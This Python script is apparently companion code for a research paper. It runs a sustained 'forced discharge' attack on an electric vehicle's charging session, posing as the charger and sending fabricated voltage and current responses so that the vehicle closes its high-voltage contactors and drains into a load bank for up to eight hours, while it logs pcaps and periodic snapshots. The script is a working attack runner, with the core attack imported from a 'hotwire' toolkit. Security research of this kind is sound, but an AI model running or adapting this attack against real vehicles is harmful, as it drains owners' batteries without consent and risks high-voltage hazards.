"""
Record a sustained Attack A2 (forced discharge) session with full pcap
+ JSONL + periodic BMS observation snapshots.

This is the companion script for the paper's "60-minute sustained
discharge" claim and its linear extrapolation to overnight impact
(Section 6 of the manuscript). Running this script against a real
vulnerable EV + resistive load bank produces four artifacts that a
reviewer can inspect to confirm the claim:

1. ``runs/<ts>/REPORT.md``        — human-readable summary, verdict
2. ``runs/<ts>/phase4_capture.pcap`` — full wire capture (Wireshark + dsV2Gshark)
3. ``runs/<ts>/session.jsonl``    — every decoded DIN message, timestamped
4. ``runs/<ts>/sustained.jsonl``  — periodic check-ins: mm:ss,
   CurrentDemandRes count, fabricated EVSEPresentVoltage,
   last EVTargetCurrent from the EV, elapsed wall seconds

The check-in cadence (default 60s) is separate from the FSM tick
rate — the FSM keeps running at ~30 ms tick the whole time; we sample
the observer's accumulated counters at coarse intervals so the output
stays small even across an 8-hour session.

Usage (PEV side — this script stays as EVSE role emitting fabricated
PreChargeRes + CurrentDemandRes; the PEV is the real vehicle):

    sudo python scripts/record_sustained.py \\
        --interface eth1 \\
        --duration 3600 \\
        --voltage 380 \\
        --current 10 \\
        --sample-interval 60

For the paper's extrapolation claim, a 3600 (60 min) run is the
single-session datum; --duration 28800 (8 h) produces the overnight
figure directly without extrapolation.

Safety: see SAFETY.md. Do not run against a vehicle without the
owner's explicit consent. The attack closes the HV contactors; ensure
the load bank and emergency disconnect are installed per
``hardware/schematics/wiring_diagram.md``.
"""
from __future__ import annotations

import argparse
import datetime as _dt
import json
import os
import sys
import time
from pathlib import Path

_THIS = Path(__file__).resolve()
sys.path.insert(0, str(_THIS.parent.parent))


def _parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--interface", "-i", required=True,
                   help="PLC modem interface (e.g. eth1)")
    p.add_argument("--duration", type=int, default=3600,
                   help="Total session duration in seconds (default 3600 = 60 min).")
    p.add_argument("--voltage", type=int, default=380,
                   help="Fabricated EVSEPresentVoltage (V) — choose close to the target battery voltage.")
    p.add_argument("--current", type=int, default=10,
                   help="Fabricated EVSEPresentCurrent (A) reported in every CurrentDemandRes.")
    p.add_argument("--sample-interval", type=int, default=60,
                   help="Sustained-log sample period in seconds (default 60).")
    p.add_argument(
        "--config", default=None,
        help="Override hotwire.ini path (default: config/hotwire.ini via HOTWIRE_CONFIG).",
    )
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(argv)

    # Lazy imports — pulls Qt-free parts of hotwire only.
    if args.config:
        os.environ["HOTWIRE_CONFIG"] = args.config
    else:
        os.environ.setdefault(
            "HOTWIRE_CONFIG",
            str(_THIS.parent.parent / "config" / "hotwire.ini"),
        )

    from hotwire.attacks import ForcedDischarge
    from hotwire.core.config import load as load_config
    from hotwire.core.modes import C_EVSE_MODE
    from hotwire.core.worker import HotWireWorker
    from hotwire.fsm.message_observer import MessageObserver
    from hotwire.fsm.pause_controller import PauseController

    # scripts/hw_check uses the RunContext infra — reuse it so the
    # captured pcap/REPORT.md fit in the usual runs/<ts>/ layout.
    sys.path.insert(0, str(_THIS.parent / "hw_check"))
    from _runner import PacketCapture, RunContext  # noqa: E402

    load_config()

    # Install the attack overrides.
    pause_controller = PauseController()
    attack = ForcedDischarge(voltage=args.voltage, current=args.current)
    attack.apply(pause_controller)
    print(attack.describe())

    # --- Observer: count CurrentDemand + capture EVTargetCurrent -----

    class _SustainedObserver(MessageObserver):
        def __init__(self) -> None:
            self.cd_seen = 0
            self.cd_sent = 0
            self.last_target_current = None
            self.last_rx_stage = None
            self.last_tx_stage = None

        def on_message(
            self, direction: str, stage: str, params: dict,
        ) -> None:
            if direction == "rx":
                self.last_rx_stage = stage
                if stage == "CurrentDemandReq":
                    self.cd_seen += 1
                    self.last_target_current = params.get(
                        "EVTargetCurrent.Value",
                        params.get("EVTargetCurrent"),
                    )
            else:
                self.last_tx_stage = stage
                if stage == "CurrentDemandRes":
                    self.cd_sent += 1

    observer = _SustainedObserver()

    # --- Spin up worker + pcap in the same runs/<ts>/ directory -----

    ctx = RunContext.create_standalone(interface=args.interface)
    ctx.log.event(
        kind="sustained.start",
        duration_s=args.duration,
        voltage=args.voltage,
        current=args.current,
        sample_interval_s=args.sample_interval,
    )

    sustained_path = ctx.run_dir / "sustained.jsonl"
    sustained_fh = sustained_path.open("w", encoding="utf-8", buffering=1)

    def _snapshot() -> dict:
        return {
            "ts": _dt.datetime.now(_dt.timezone.utc).isoformat(
                timespec="milliseconds",
            ),
            "elapsed_s": round(time.monotonic() - t0, 2),
            "cd_res_sent": observer.cd_sent,
            "cd_req_seen": observer.cd_seen,
            "last_target_current_A": observer.last_target_current,
            "last_rx_stage": observer.last_rx_stage,
            "last_tx_stage": observer.last_tx_stage,
            "fabricated_voltage_V": args.voltage,
            "fabricated_current_A": args.current,
        }

    t0 = time.monotonic()
    deadline = t0 + args.duration
    next_sample = t0 + args.sample_interval
    bpf = "ether proto 0x88E1 or ip6"

    with PacketCapture(
        ctx, phase="phase4", interface=args.interface, bpf=bpf,
    ) as cap:
        if cap.available and cap.pcap_path:
            print(f"[ok] pcap: {cap.pcap_path}")

        try:
            worker = HotWireWorker(
                callbackAddToTrace=lambda s: ctx.log.event(
                    kind="sustained.trace", message=s,
                ),
                callbackShowStatus=lambda *a, **kw: None,
                mode=C_EVSE_MODE,
                isSimulationMode=0,
                pause_controller=pause_controller,
                message_observer=observer,
            )
        except Exception as e:                                    # noqa: BLE001
            ctx.log.event(
                kind="sustained.worker_error",
                exc_type=type(e).__name__, message=str(e),
            )
            print(f"[err] worker construction failed: {e}")
            ctx.close()
            return 2

        print(
            f"[run] attack active for {args.duration}s "
            f"(checkpoint every {args.sample_interval}s)"
        )

        try:
            while time.monotonic() < deadline:
                try:
                    worker.mainfunction()
                except Exception as e:                            # noqa: BLE001
                    ctx.log.event(
                        kind="sustained.tick_error",
                        exc_type=type(e).__name__,
                        message=str(e),
                    )
                if time.monotonic() >= next_sample:
                    rec = _snapshot()
                    sustained_fh.write(json.dumps(rec) + "\n")
                    print(
                        f"  [{rec['elapsed_s']:>8.1f}s] "
                        f"CD sent={rec['cd_res_sent']:<5d} "
                        f"seen={rec['cd_req_seen']:<5d} "
                        f"target_I={rec['last_target_current_A']}"
                    )
                    next_sample += args.sample_interval
                time.sleep(0.03)
        except KeyboardInterrupt:
            print("[abort] user interrupt; recording final snapshot")

        # Final snapshot regardless.
        rec = _snapshot()
        sustained_fh.write(json.dumps(rec) + "\n")
        sustained_fh.close()

        for attr in ("shutdown", "stop", "close"):
            fn = getattr(worker, attr, None)
            if callable(fn):
                try:
                    fn()
                except Exception:                                 # noqa: BLE001
                    pass
                break

    # --- Produce verdict ---------------------------------------------

    elapsed = time.monotonic() - t0
    ok = (observer.cd_sent >= max(5, args.duration // 10) and
          observer.cd_seen >= max(5, args.duration // 10))

    summary = (
        f"Sustained Attack A2 run for {elapsed:.1f}s "
        f"(target {args.duration}s). "
        f"CD Req seen: {observer.cd_seen}, CD Res sent: {observer.cd_sent}. "
        f"Fabricated V={args.voltage}V, I={args.current}A held throughout."
    )
    ctx.log.event(
        kind="sustained.end",
        elapsed_s=round(elapsed, 2),
        cd_req_seen=observer.cd_seen,
        cd_res_sent=observer.cd_sent,
        verdict="OK" if ok else "INSUFFICIENT",
    )
    print()
    print("=" * 60)
    print(summary)
    print("=" * 60)
    print(f"Artifacts under: {ctx.run_dir}")
    print(f"  - REPORT.md")
    print(f"  - session.jsonl")
    print(f"  - sustained.jsonl (periodic checkpoints)")
    if cap.pcap_path:
        print(f"  - {cap.pcap_path.name}")
    ctx.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
